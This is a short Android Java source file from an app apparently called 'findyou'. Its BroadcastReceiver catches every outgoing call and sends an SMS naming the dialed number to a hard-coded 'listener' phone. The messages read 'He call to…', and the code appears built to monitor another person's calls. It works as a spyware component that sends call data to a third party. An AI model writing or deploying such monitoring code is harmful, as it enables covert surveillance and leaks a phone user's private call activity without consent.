package com.example.findyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.widget.Toast;

/**
 * Created by Pengbing on 2017/5/7.
 */

public class ToPhoneReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        //获取打电话的号码
        String toPhoneNum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

        String msg = "He call to " + toPhoneNum;
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(MyConstants.listenerPhoneNum , null, msg, null, null);

        Toast.makeText(context,toPhoneNum,Toast.LENGTH_SHORT).show();

    }
}
